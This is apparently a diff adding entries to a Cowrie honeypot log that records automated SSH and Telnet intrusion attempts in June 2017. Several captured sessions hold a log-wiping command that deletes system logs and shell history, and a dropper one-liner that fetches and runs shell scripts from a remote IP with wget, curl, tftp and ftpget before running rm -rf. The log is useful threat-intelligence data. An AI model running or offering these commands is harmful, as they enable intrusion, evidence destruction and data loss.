@@ -989,3 +989,199 @@
 2017-06-07T06:58:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8602,91.195.103.180] direct-tcp connection request to 37.1.206.139:80 from localhost:5556
 2017-06-07T06:58:01+0000 [CowrieTelnetTransport,22950,51.15.44.41] login attempt: 924
 2017-06-07T06:58:01+0000 [CowrieTelnetTransport,22950,51.15.44.41] login return, expect: [root/54321]
+2017-06-07T06:58:03+0000 [CowrieTelnetTransport,22950,51.15.44.41] login attempt [enable/shell] failed
+2017-06-07T06:58:03+0000 [CowrieTelnetTransport,22950,51.15.44.41] Warning: state changed and new state returned
+2017-06-07T06:58:03+0000 [CowrieTelnetTransport,22950,51.15.44.41] login attempt: 925
+2017-06-07T06:58:03+0000 [CowrieTelnetTransport,22950,51.15.44.41] login return, expect: [root/54321]
+2017-06-07T06:58:05+0000 [CowrieTelnetTransport,22950,51.15.44.41] login attempt [sh//bin/busybox ECCHI] failed
+2017-06-07T06:58:05+0000 [CowrieTelnetTransport,22950,51.15.44.41] Warning: state changed and new state returned
+2017-06-07T06:58:05+0000 [SSHChannel None (40) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8602,91.195.103.180] direct-tcp forward to 37.1.206.139:80 with data 'POST / HTTP/1.1\r\nConnection: close\r\nContent-Length: 21\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: work.a-poster.info\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n\r\ndata=fbbbacbbeffcecaa'
+2017-06-07T06:58:05+0000 [SSHChannel None (40) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8602,91.195.103.180] failed to connect: Connection refused
+2017-06-07T06:58:05+0000 [SSHChannel None (40) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8602,91.195.103.180] sending close 40
+2017-06-07T06:58:05+0000 [SSHChannel None (40) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8602,91.195.103.180] remote eof
+2017-06-07T06:58:05+0000 [SSHChannel None (40) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8602,91.195.103.180] remote close
+2017-06-07T06:58:05+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8602,91.195.103.180] got channel 'direct-tcpip' request
+2017-06-07T06:58:05+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8602,91.195.103.180] direct-tcp connection request to 37.1.206.139:25000 from localhost:5556
+2017-06-07T06:58:05+0000 [SSHChannel None (41) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8602,91.195.103.180] direct-tcp forward to 37.1.206.139:25000 with data 'POST / HTTP/1.1\r\nConnection: close\r\nContent-Length: 21\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: work.a-poster.info\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n\r\n'
+2017-06-07T06:58:05+0000 [SSHChannel None (41) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8602,91.195.103.180] failed to connect: Connection refused
+2017-06-07T06:58:05+0000 [SSHChannel None (41) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8602,91.195.103.180] sending close 41
+2017-06-07T06:58:05+0000 [SSHChannel None (41) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8602,91.195.103.180] direct-tcp forward to 37.1.206.139:25000 with data 'data=fbbbacbbeffcecaa'
+2017-06-07T06:58:05+0000 [SSHChannel None (41) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8602,91.195.103.180] failed to connect: Connection refused
+2017-06-07T06:58:08+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 118.140.120.26:4202 (10.8.41.81:2222) [session: 720afdae]
+2017-06-07T06:58:08+0000 [HoneyPotSSHTransport,8726,118.140.120.26] Remote SSH version: SSH-2.0-libssh2_1.7.0
+2017-06-07T06:58:08+0000 [HoneyPotSSHTransport,8726,118.140.120.26] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-rsa'
+2017-06-07T06:58:08+0000 [HoneyPotSSHTransport,8726,118.140.120.26] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-07T06:58:08+0000 [HoneyPotSSHTransport,8726,118.140.120.26] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-07T06:58:10+0000 [HoneyPotSSHTransport,8726,118.140.120.26] NEW KEYS
+2017-06-07T06:58:10+0000 [HoneyPotSSHTransport,8726,118.140.120.26] starting service 'ssh-userauth'
+2017-06-07T06:58:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8726,118.140.120.26] 'tester' trying auth 'password'
+2017-06-07T06:58:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8726,118.140.120.26] first time for 118.140.120.26, need: 1
+2017-06-07T06:58:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8726,118.140.120.26] login attempt: 1
+2017-06-07T06:58:13+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8726,118.140.120.26] login attempt [tester/tester] succeeded
+2017-06-07T06:58:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8726,118.140.120.26] 'tester' authenticated with 'password'
+2017-06-07T06:58:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8726,118.140.120.26] starting service 'ssh-connection'
+2017-06-07T06:58:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] got channel 'session' request
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] channel open
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] executing command "unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH ; history -n ; export HISTFILE=/dev/null ; export HISTSIZE=0; export HISTFILESIZE=0 ; rm -rf /var/log/wtmp ; rm -rf /var/log/lastlog ; rm -rf /var/log/secure ; rm -rf /var/log/xferlog ; rm -rf /var/log/messages ; rm -rf /var/run/utmp ; touch /var/run/utmp ; touch /var/log/messages ; touch /var/log/wtmp ; touch /var/log/messages ; touch /var/log/xferlog ; touch /var/log/secure ;  touch /var/log/lastlog ; rm -rf /var/log/maillog ; touch /var/log/maillog ; rm -rf /root/.bash_history ; touch /root/.bash_history ; history -r "
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Opening TTY Log: log/tty/20170607-065815-720afdae-0e.log
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] CMD: unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH ; history -n ; export HISTFILE=/dev/null ; export HISTSIZE=0; export HISTFILESIZE=0 ; rm -rf /var/log/wtmp ; rm -rf /var/log/lastlog ; rm -rf /var/log/secure ; rm -rf /var/log/xferlog ; rm -rf /var/log/messages ; rm -rf /var/run/utmp ; touch /var/run/utmp ; touch /var/log/messages ; touch /var/log/wtmp ; touch /var/log/messages ; touch /var/log/xferlog ; touch /var/log/secure ;  touch /var/log/lastlog ; rm -rf /var/log/maillog ; touch /var/log/maillog ; rm -rf /root/.bash_history ; touch /root/.bash_history ; history -r 
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: history -n
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: export HISTFILE=/dev/null
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: export HISTSIZE=0
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: export HISTFILESIZE=0
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: rm -rf /var/log/wtmp
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: rm -rf /var/log/lastlog
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: rm -rf /var/log/secure
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: rm -rf /var/log/xferlog
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: rm -rf /var/log/messages
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: rm -rf /var/run/utmp
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: touch /var/run/utmp
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: touch /var/log/messages
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: touch /var/log/wtmp
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: touch /var/log/messages
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: touch /var/log/xferlog
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: touch /var/log/secure
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: touch /var/log/lastlog
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: rm -rf /var/log/maillog
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: touch /var/log/maillog
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: rm -rf /root/.bash_history
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: touch /root/.bash_history
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: history -r
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] exitCode: 0
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] sending request 'exit-status'
+2017-06-07T06:58:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] sending close 0
+2017-06-07T06:58:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] got channel 'session' request
+2017-06-07T06:58:15+0000 [SSHChannel session (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] channel open
+2017-06-07T06:58:15+0000 [SSHChannel session (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] executing command "uname"
+2017-06-07T06:58:15+0000 [SSHChannel session (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Opening TTY Log: log/tty/20170607-065815-720afdae-1e.log
+2017-06-07T06:58:15+0000 [SSHChannel session (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] CMD: uname
+2017-06-07T06:58:15+0000 [SSHChannel session (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: uname 
+2017-06-07T06:58:15+0000 [SSHChannel session (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] exitCode: 0
+2017-06-07T06:58:15+0000 [SSHChannel session (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] sending request 'exit-status'
+2017-06-07T06:58:15+0000 [SSHChannel session (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] sending close 1
+2017-06-07T06:58:16+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] got channel 'session' request
+2017-06-07T06:58:16+0000 [SSHChannel session (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] channel open
+2017-06-07T06:58:16+0000 [SSHChannel session (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] executing command "free -m"
+2017-06-07T06:58:16+0000 [SSHChannel session (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Opening TTY Log: log/tty/20170607-065816-720afdae-2e.log
+2017-06-07T06:58:16+0000 [SSHChannel session (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] CMD: free -m
+2017-06-07T06:58:16+0000 [SSHChannel session (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: free -m
+2017-06-07T06:58:16+0000 [SSHChannel session (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] exitCode: 0
+2017-06-07T06:58:16+0000 [SSHChannel session (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] sending request 'exit-status'
+2017-06-07T06:58:16+0000 [SSHChannel session (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] sending close 2
+2017-06-07T06:58:16+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] got channel 'session' request
+2017-06-07T06:58:16+0000 [SSHChannel session (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] channel open
+2017-06-07T06:58:17+0000 [SSHChannel session (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] executing command "ps -x"
+2017-06-07T06:58:17+0000 [SSHChannel session (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Opening TTY Log: log/tty/20170607-065817-720afdae-3e.log
+2017-06-07T06:58:17+0000 [SSHChannel session (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] CMD: ps -x
+2017-06-07T06:58:17+0000 [SSHChannel session (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: ps -x
+2017-06-07T06:58:17+0000 [SSHChannel session (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] exitCode: 0
+2017-06-07T06:58:17+0000 [SSHChannel session (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] sending request 'exit-status'
+2017-06-07T06:58:17+0000 [SSHChannel session (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] sending close 3
+2017-06-07T06:58:17+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] got channel 'session' request
+2017-06-07T06:58:17+0000 [SSHChannel session (4) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] channel open
+2017-06-07T06:58:17+0000 [SSHChannel session (4) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] executing command "cat /proc/cpuinfo"
+2017-06-07T06:58:17+0000 [SSHChannel session (4) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Opening TTY Log: log/tty/20170607-065817-720afdae-4e.log
+2017-06-07T06:58:17+0000 [SSHChannel session (4) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] CMD: cat /proc/cpuinfo
+2017-06-07T06:58:17+0000 [SSHChannel session (4) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Command found: cat /proc/cpuinfo
+2017-06-07T06:58:17+0000 [SSHChannel session (4) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] exitCode: 0
+2017-06-07T06:58:17+0000 [SSHChannel session (4) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] sending request 'exit-status'
+2017-06-07T06:58:17+0000 [SSHChannel session (4) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] sending close 4
+2017-06-07T06:58:18+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Closing TTY Log: log/tty/20170607-065815-720afdae-0e.log after 3 seconds
+2017-06-07T06:58:18+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] honeypot terminal protocol connection lost disconnected
+2017-06-07T06:58:18+0000 [SSHChannel session (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Closing TTY Log: log/tty/20170607-065815-720afdae-1e.log after 2 seconds
+2017-06-07T06:58:18+0000 [SSHChannel session (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] honeypot terminal protocol connection lost disconnected
+2017-06-07T06:58:18+0000 [SSHChannel session (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Closing TTY Log: log/tty/20170607-065816-720afdae-2e.log after 1 seconds
+2017-06-07T06:58:18+0000 [SSHChannel session (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] honeypot terminal protocol connection lost disconnected
+2017-06-07T06:58:18+0000 [SSHChannel session (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Closing TTY Log: log/tty/20170607-065817-720afdae-3e.log after 1 seconds
+2017-06-07T06:58:18+0000 [SSHChannel session (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] honeypot terminal protocol connection lost disconnected
+2017-06-07T06:58:18+0000 [SSHChannel session (4) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] Closing TTY Log: log/tty/20170607-065817-720afdae-4e.log after 0 seconds
+2017-06-07T06:58:18+0000 [SSHChannel session (4) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8726,118.140.120.26] honeypot terminal protocol connection lost disconnected
+2017-06-07T06:58:18+0000 [HoneyPotSSHTransport,8726,118.140.120.26] avatar tester logging out
+2017-06-07T06:58:18+0000 [HoneyPotSSHTransport,8726,118.140.120.26] connection lost
+2017-06-07T06:58:18+0000 [HoneyPotSSHTransport,8726,118.140.120.26] Connection lost after 10 seconds
+2017-06-07T06:58:19+0000 [CowrieTelnetTransport,22945,51.15.44.41] Connection lost after 100 seconds
+2017-06-07T06:58:19+0000 [CowrieTelnetTransport,22948,51.15.44.41] Connection lost after 90 seconds
+2017-06-07T06:58:19+0000 [CowrieTelnetTransport,22946,51.15.44.41] Connection lost after 100 seconds
+2017-06-07T06:58:19+0000 [CowrieTelnetTransport,22947,51.15.44.41] Connection lost after 90 seconds
+2017-06-07T06:58:19+0000 [CowrieTelnetTransport,22943,51.15.44.41] Connection lost after 100 seconds
+2017-06-07T06:58:23+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8725,163.172.138.239] remote close
+2017-06-07T06:58:23+0000 [HoneyPotSSHTransport,8725,163.172.138.239] avatar admin logging out
+2017-06-07T06:58:23+0000 [HoneyPotSSHTransport,8725,163.172.138.239] connection lost
+2017-06-07T06:58:23+0000 [HoneyPotSSHTransport,8725,163.172.138.239] Connection lost after 34 seconds
+2017-06-07T06:58:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8620,91.230.47.81] got channel 'direct-tcpip' request
+2017-06-07T06:58:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8620,91.230.47.81] direct-tcp connection request to 107.6.186.178:80 from localhost:5556
+2017-06-07T06:58:36+0000 [SSHChannel None (112) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8620,91.230.47.81] direct-tcp forward to 107.6.186.178:80 with data 'GET /internals/api/ip?1496818667680676418 HTTP/1.1\r\nHost: ip5.adspy.mobi\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.67 Safari/537.36\r\nAccept-Encoding: gzip, deflate, sdch\r\n\r\n'
+2017-06-07T06:58:36+0000 [SSHChannel None (112) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8620,91.230.47.81] failed to connect: Connection refused
+2017-06-07T06:58:36+0000 [SSHChannel None (112) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8620,91.230.47.81] sending close 112
+2017-06-07T06:58:36+0000 [CowrieTelnetTransport,22950,51.15.44.41] Connection lost after 47 seconds
+2017-06-07T06:58:48+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 163.172.138.239:44054 (10.8.41.81:2222) [session: 600104ca]
+2017-06-07T06:58:48+0000 [HoneyPotSSHTransport,8727,163.172.138.239] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-06-07T06:58:48+0000 [HoneyPotSSHTransport,8727,163.172.138.239] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-07T06:58:48+0000 [HoneyPotSSHTransport,8727,163.172.138.239] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-07T06:58:48+0000 [HoneyPotSSHTransport,8727,163.172.138.239] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-07T06:58:48+0000 [HoneyPotSSHTransport,8727,163.172.138.239] NEW KEYS
+2017-06-07T06:58:49+0000 [HoneyPotSSHTransport,8727,163.172.138.239] starting service 'ssh-userauth'
+2017-06-07T06:58:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8727,163.172.138.239] 'admin' trying auth 'password'
+2017-06-07T06:58:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8727,163.172.138.239] login attempt: 173
+2017-06-07T06:58:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8727,163.172.138.239] login return, expect: [admin/admin]
+2017-06-07T06:58:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8727,163.172.138.239] login attempt [admin/admin] succeeded
+2017-06-07T06:58:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8727,163.172.138.239] 'admin' authenticated with 'password'
+2017-06-07T06:58:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8727,163.172.138.239] starting service 'ssh-connection'
+2017-06-07T06:58:54+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8727,163.172.138.239] got channel 'session' request
+2017-06-07T06:58:54+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8727,163.172.138.239] channel open
+2017-06-07T06:58:54+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8727,163.172.138.239] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.48.238/armex.sh; curl -O http://51.15.48.238/armex.sh; chmod 777 armex.sh; sh armex.sh; tftp 51.15.48.238 -c get armexft.sh; chmod 777 armexft.sh; sh armexft.sh; tftp 51.15.48.238 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.48.238; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+	"
+2017-06-07T06:58:54+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8727,163.172.138.239] Opening TTY Log: log/tty/20170607-065854-600104ca-0e.log
+2017-06-07T06:58:54+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8727,163.172.138.239] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.48.238/armex.sh; curl -O http://51.15.48.238/armex.sh; chmod 777 armex.sh; sh armex.sh; tftp 51.15.48.238 -c get armexft.sh; chmod 777 armexft.sh; sh armexft.sh; tftp 51.15.48.238 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.48.238; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+	
+2017-06-07T06:58:54+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8727,163.172.138.239] Command found: cd /tmp
+2017-06-07T06:58:54+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8727,163.172.138.239] Command found: cd /var/run
+2017-06-07T06:58:54+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8727,163.172.138.239] Command found: cd /mnt
+2017-06-07T06:58:54+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8727,163.172.138.239] Command found: cd /root
+2017-06-07T06:58:54+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8727,163.172.138.239] Command found: cd /
+2017-06-07T06:58:54+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8727,163.172.138.239] Command found: wget http://51.15.48.238/armex.sh
+2017-06-07T06:58:54+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Downloaded URL (http://51.15.48.238/armex.sh) with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: curl -O http://51.15.48.238/armex.sh
+2017-06-07T06:58:54+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-07T06:58:54+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Downloaded URL (http://51.15.48.238/armex.sh) with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: chmod 777 /armex.sh
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: sh /armex.sh
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.48.238 -c get armexft.sh
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: chmod 777 armexft.sh
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: sh armexft.sh
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.48.238 -c get tftp1.sh
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 51.15.48.238
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] FTP retrieval failed: 425 Security: Bad IP connecting.
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: rm -rf /armex.sh tftp1.sh tftp2.sh ftp1.sh
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] exitCode: 0
